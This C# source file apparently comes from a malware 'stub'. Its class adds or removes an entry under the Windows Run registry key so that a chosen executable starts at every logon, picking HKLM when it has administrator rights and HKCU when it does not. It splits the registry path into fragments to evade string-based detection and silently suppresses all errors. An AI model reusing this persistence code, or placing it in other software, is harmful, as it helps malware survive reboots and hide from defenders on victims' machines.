using Microsoft.Win32;
using System;
using System.Security.Principal;

namespace Stub.Help
{
    class Registration
    {
        private const string REG = @"Software\Microsoft\Win" + @"dows\Current" + @"Version\" + "Run";

        public static void Inizialize(bool enable, string name, string localpath)
        {
            try
            {
                RegistryHive registryHive = CheckAP.IsAdmin() ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;
                RegistryView registryView = CheckAP.IsWin64 ? RegistryView.Registry64 : RegistryView.Registry32;

                using (var registry = RegistryKey.OpenBaseKey(registryHive, registryView))
                {
                    using (RegistryKey runKey = registry.OpenSubKey(REG, CheckAP.IsWin64))
                    {
                        if (!enable)
                        {
                            try
                            {
                                runKey?.DeleteValue(name);
                            }
                            catch { }
                        }
                        else
                        {
                            try
                            {
                                runKey?.SetValue(name, localpath);
                            }
                            catch { }
                        }
                    }
                }
            }
            catch { }
        }
    }

    public class CheckAP
    {
        public static bool IsWin64 => Environment.Is64BitOperatingSystem ? true : false;
        public static bool IsAdmin()
        {
            try
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }
    }
}
